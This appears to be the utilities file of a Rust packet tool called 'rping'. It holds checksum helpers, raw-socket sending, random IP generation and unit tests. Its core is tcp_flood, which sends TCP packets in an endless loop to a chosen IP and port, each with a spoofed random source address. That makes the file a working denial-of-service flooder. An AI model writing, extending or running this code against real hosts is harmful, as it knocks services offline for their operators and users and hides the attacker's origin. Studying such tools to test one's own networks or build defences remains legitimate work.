use crate::ip::IpHeader;
use crate::tcp::TcpHeader;
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use socket2::{Domain, Protocol, SockAddr, Socket, Type};
use std::io;
use std::net::{Ipv4Addr, SocketAddrV4};

/// Calculates the TCP checksum.
///
/// # Arguments
///
/// * `ip_header` - The IP header.
/// * `tcp_header` - The TCP header.
///
/// # Returns
///
/// (`u16`): The calculated TCP checksum.
///
/// # Examples
///
/// ```
/// use rping::utils::calculate_tcp_checksum;
/// use rping::ip::IpHeader;
/// use rping::tcp::TcpHeader;
///
/// let ip_header = IpHeader {
///     version_ihl: 0x45,
///     tos: 0,
///     len: 20,
///     id: 0,
///     offset: 0,
///     ttl: 64,
///     protocol: 6,
///     sum: 0,
///     src: 0xC0A80001, // 192.168.0.1
///     dst: 0xC0A80002, // 192.168.0.2
/// };
///
/// let tcp_header = TcpHeader {
///     sport: 8080,
///     dport: 80,
///     seq: 12345,
///     ack: 0,
///     off_reserved_flags: 0x5010,
///     win: 1024,
///     sum: 0,
///     urp: 0,
///     opt: 0,
///     pad: 0,
/// };
///
/// let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);
/// assert_eq!(checksum, 33849);
/// ```
pub fn calculate_tcp_checksum(ip_header: &IpHeader, tcp_header: &TcpHeader) -> u16 {
    let pseudo_header = [
        ((u32::from_be(ip_header.src) >> 16) & 0xFFFF) as u16,
        (u32::from_be(ip_header.src) & 0xFFFF) as u16,
        ((u32::from_be(ip_header.dst) >> 16) & 0xFFFF) as u16,
        (u32::from_be(ip_header.dst) & 0xFFFF) as u16,
        u16::from_be(ip_header.protocol.into()),
        std::mem::size_of::<TcpHeader>() as u16,
    ];

    let tcp_header_bytes: &[u8] = tcp_header.as_bytes();

    let mut sum = 0u32;

    // Sum pseudo header
    for word in pseudo_header.iter() {
        sum = sum.wrapping_add(u32::from(*word));
    }

    // Sum TCP header and payload
    for i in (0..tcp_header_bytes.len()).step_by(2) {
        if i + 1 < tcp_header_bytes.len() {
            sum = sum.wrapping_add(
                (u32::from(tcp_header_bytes[i])) << 8 | u32::from(tcp_header_bytes[i + 1]),
            );
        } else {
            sum = sum.wrapping_add(u32::from(tcp_header_bytes[i]) << 8);
        }
    }

    // Fold 32-bit sum to 16 bits
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum as u16
}

/// Sends a raw IP packet with the given headers and source IP address.
///
/// This function constructs a raw IP packet using the provided headers and sends it to the specified destination.
/// It uses the `socket2` library for creating a raw socket and sending the packet.
/// The source IP address is set directly in the packet buffer.
///
/// # Arguments
/// * `ip_header` - A slice representing the IP header.
/// * `dest_ip` - The destination IP address as a string.
/// * `dest_port` - The destination port number.
/// * `packet_len` - The syn packet length.
///
/// # Returns
/// This function does not return a meaningful result. Panics if there is an error during packet sending.
///
/// # Examples
///
/// ```rust
/// use rping::utils::send_raw_ip_packet;
///
/// // Example usage of the send_raw_ip_packet function
/// let ip_header: &[u8] = &[];
/// let dest_ip = "192.168.0.2";
/// let dest_port = 8080;
/// // send_raw_ip_packet(ip_header, dest_ip, dest_port, 1500);
/// ```
pub fn send_raw_ip_packet(
    ip_header: &[u8],
    dest_ip: &str,
    dest_port: u16,
    packet_len: usize,
) -> io::Result<()> {
    let socket = Socket::new(Domain::IPV4, Type::RAW, Some(Protocol::from(6))).unwrap();

    let dest_addr = SocketAddrV4::new(dest_ip.parse().unwrap(), dest_port);

    let _ = socket.set_header_included(true);

    // Connect the socket
    socket.connect(&SockAddr::from(dest_addr)).unwrap();
    // Ensure buffer has enough space
    let mut buffer = vec![0u8; packet_len];
    buffer[..ip_header.len()].copy_from_slice(ip_header);
    // Use `send` to send data on a connected TCP socket
    socket.send(&buffer)?;

    Ok(())
}

/// Generates a random IP address within the range [0.0.0.0, 255.255.255.255].
///
/// # Returns
///
/// (`u32`): The generated random IP address.
///
/// # Examples
///
/// ```
/// use rping::utils::generate_random_ip;
///
/// let random_ip = generate_random_ip();
/// ```
pub fn generate_random_ip() -> u32 {
    let min_ip: u32 = Ipv4Addr::new(0, 0, 0, 0).into();
    let max_ip: u32 = Ipv4Addr::new(255, 255, 255, 255).into();
    let random_ip: u32 = rand::thread_rng().gen_range(min_ip..=max_ip);
    random_ip
}

/// Calculates the IP header checksum based on the provided `IpHeader`.
///
/// # Safety
///
/// This function relies on unsafe pointer operations to treat the `IpHeader`
/// as a slice of u16. Ensure that the size of `IpHeader` is a multiple of 2 bytes.
/// The function performs the checksum calculation based on the 16-bit words in the header.
///
/// # Arguments
///
/// * `ip_header` - A reference to the `IpHeader` struct for which the checksum is calculated.
///
/// # Returns
///
/// Returns the calculated IP header checksum as a u16.
pub fn calculate_ip_checksum(ip_header: &IpHeader) -> u16 {
    // SAFETY: We know that the size of IpHeader is a multiple of 2 bytes.
    // This allows us to safely cast the IpHeader to a slice of u16.
    let words = unsafe {
        std::slice::from_raw_parts(
            ip_header as *const _ as *const u16,
            std::mem::size_of::<IpHeader>() / 2,
        )
    };

    // Calculate the sum of 16-bit words as u32
    let sum: u32 = words.iter().map(|&word| u32::from(word)).sum();

    // Calculate carry and fold the sum to 16 bits
    let carry = sum >> 16;
    let folded_sum = (sum & 0xFFFF) + carry;

    // Calculate and return the one's complement checksum
    !folded_sum as u16
}

/// Creates a combined header by concatenating the bytes of IP and TCP headers.
///
/// # Arguments
///
/// * `ip_header` - The IP header.
/// * `tcp_header` - The TCP header.
///
/// # Returns
///
/// (`Vec<u8>`): The combined header bytes.
///
/// # Examples
///
/// ```
/// use rping::utils::{create_combined_header, generate_random_ip};
/// use rping::tcp::TcpHeader;
/// use rping::ip::IpHeader;
///
/// let source_ip = generate_random_ip();
/// let ip_header = IpHeader::new(source_ip, "192.168.0.1");
/// let tcp_header = TcpHeader::new(80);
///
/// let combined_header = create_combined_header(&ip_header, &tcp_header);
/// assert_eq!(combined_header.len(), std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>());
/// ```
pub fn create_combined_header(ip_header: &IpHeader, tcp_header: &TcpHeader) -> Vec<u8> {
    let ip_bytes = ip_header.as_bytes();
    let tcp_bytes = tcp_header.as_bytes();

    ip_bytes
        .iter()
        .cloned()
        .chain(tcp_bytes.iter().cloned())
        .collect()
}

/// Generates and sends TCP flood packets in an infinite loop.
///
/// This function continuously generates TCP flood packets with random parameters and sends them.
/// It uses a loop to perform the following steps:
/// 1. Fill in the TCP header with random values.
/// 2. Fill in the IP header with random values and calculate the packet length.
/// 3. Calculate the TCP checksum.
/// 4. Combine the IP and TCP headers into a buffer.
/// 5. Set the source IP address in the buffer.
/// 6. Send the spoofed packet using the `send_raw_ip_packet` function.
///
/// # Arguments
///
/// * `packet_len` - The packet length.
/// * `dest_ip` - The target ip.
/// * `dest_port` - The target port.
///
/// # Returns
/// This function does not return as it runs in an infinite loop.
///
/// # Examples
/// ```rust
/// use rping::utils::tcp_flood;
///
/// // Example usage of the tcp_flood function
/// // tcp_flood(1500, "192.168.1.10", 80);
/// ```
pub fn tcp_flood(packet_len: usize, dest_ip: &str, dest_port: u16) {
    let progress_bar = ProgressBar::new_spinner();
    progress_bar.set_style(
        ProgressStyle::default_spinner()
            .tick_chars("/|\\- ")
            .template("{spinner:.green} {msg}")
            .unwrap(),
    );
    progress_bar.set_message("Flooding...");

    loop {
        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, dest_ip);
        let tcp_header = TcpHeader::new(dest_port);

        // ip_header.len = (packet_len - std::mem::size_of::<IpHeader>() as usize) as u16;
        let combined_header_slice = create_combined_header(&ip_header, &tcp_header);
        let _ = send_raw_ip_packet(&combined_header_slice, dest_ip, dest_port, packet_len);
        progress_bar.inc(1);
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_calculate_tcp_checksum() {
        let ip_header = IpHeader {
            version_ihl: 0x45,
            tos: 0,
            len: 20,
            id: 0,
            offset: 0,
            ttl: 64,
            protocol: 6,
            sum: 0,
            src: 0xC0A80001, // 192.168.0.1
            dst: 0xC0A80002, // 192.168.0.2
        };

        let tcp_header = TcpHeader {
            sport: 8080,
            dport: 80,
            seq: 12345,
            ack: 0,
            off_reserved_flags: 0x5010,
            win: 1024,
            sum: 0,
            urp: 0,
            opt: 0,
            pad: 0,
        };

        let checksum = calculate_tcp_checksum(&ip_header, &tcp_header);

        assert_eq!(checksum, 33849);
    }

    #[test]
    fn test_fill_ip_header() {
        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, "192.168.1.10");
        assert_eq!(ip_header.version_ihl, 0x45); // Assuming IHL is 5 words
        assert_eq!(ip_header.protocol, 6);
    }

    #[test]
    fn test_create_combined_header() {
        let source_ip = generate_random_ip();
        let ip_header = IpHeader::new(source_ip, "192.168.1.10");
        let tcp_header = TcpHeader::new(80);

        let combined_header = create_combined_header(&ip_header, &tcp_header);
        assert_eq!(
            combined_header.len(),
            std::mem::size_of::<IpHeader>() + std::mem::size_of::<TcpHeader>()
        );
    }

    #[test]
    fn test_calculate_ip_checksum() {
        let ip_header = IpHeader {
            version_ihl: 0x45,
            tos: 0,
            len: 20,
            id: 0,
            offset: 0,
            ttl: 50,
            protocol: 6,
            sum: 0,
            src: 0xC0A80101, // 192.168.1.1
            dst: 0xC0A80102, // 192.168.1.2
        };

        let checksum = calculate_ip_checksum(&ip_header);

        let expected_checksum = 30240;

        assert_eq!(checksum, expected_checksum);
    }
}
